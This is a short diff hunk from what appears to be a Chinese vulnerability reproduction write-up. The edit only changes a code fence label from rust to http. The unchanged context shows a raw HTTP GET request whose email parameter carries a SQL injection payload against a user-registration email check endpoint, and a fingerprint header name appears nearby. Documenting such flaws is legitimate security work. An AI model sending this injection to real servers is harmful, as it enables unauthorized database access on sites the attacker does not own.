@@ -49,7 +49,7 @@ header="YP_onlineid"
 
 
 # 四、漏洞复现
-```rust
+```http
 GET /index.php?g=User&m=Register&a=checkEmail&userid=1&email=-69710348@nwcrb.com'+or+'1'='2" HTTP/1.1
 Host: 
 Accept: */*
